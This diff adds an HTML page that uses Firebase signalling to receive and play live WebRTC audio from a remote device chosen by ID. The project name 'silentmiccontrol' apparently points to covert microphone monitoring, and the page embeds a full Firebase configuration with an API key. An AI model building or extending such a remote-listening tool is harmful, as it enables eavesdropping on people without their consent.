@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Live Audio Stream</title>
+</head>
+<body>
+  <h2>🎧 Live Audio Stream</h2>
+  <p id="status">Waiting for audio...</p>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, onValue, push, onChildAdded, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+    // ✅ Real Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBhGRecTTqVEKFiOHIWzalUDwneHTyceEc",
+      authDomain: "silentmiccontrol.firebaseapp.com",
+      databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com",
+      projectId: "silentmiccontrol",
+      storageBucket: "silentmiccontrol.firebasestorage.app",
+      messagingSenderId: "970778075127",
+      appId: "1:970778075127:web:038be49993e1555ed418f2"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // ✅ Get device ID from URL
+    const params = new URLSearchParams(window.location.search);
+    const deviceId = params.get("device");
+    if (!deviceId) {
+      document.getElementById("status").textContent = "❌ Missing device ID.";
+      throw new Error("No device ID");
+    }
+
+    const peer = new RTCPeerConnection();
+
+    // 🔊 Handle incoming audio
+    peer.ontrack = (event) => {
+      const stream = event.streams[0];
+      const audio = new Audio();
+      audio.srcObject = stream;
+      audio.play();
+      document.getElementById("status").textContent = "🔊 Listening live...";
+    };
+
+    // 🔁 Add remote ICE candidates
+    onChildAdded(ref(db, `live_audio/${deviceId}/webrtc/candidate`), (snap) => {
+      const val = snap.val();
+      peer.addIceCandidate(new RTCIceCandidate(val));
+    });
+
+    // 🔁 Set remote SDP offer
+    onValue(ref(db, `live_audio/${deviceId}/webrtc/offer`), async (snap) => {
+      const offer = snap.val();
+      if (!offer) return;
+
+      await peer.setRemoteDescription(new RTCSessionDescription(offer));
+      const answer = await peer.createAnswer();
+      await peer.setLocalDescription(answer);
+
+      await set(ref(db, `live_audio/${deviceId}/webrtc/answer`), peer.localDescription.toJSON());
+    });
+
+    // 📡 Push our ICE candidates
+    peer.onicecandidate = (event) => {
+      if (event.candidate) {
+        push(ref(db, `live_audio/${deviceId}/webrtc/remote_candidate`), event.candidate.toJSON());
+      }
+    };
+  </script>
+</body>
+</html>
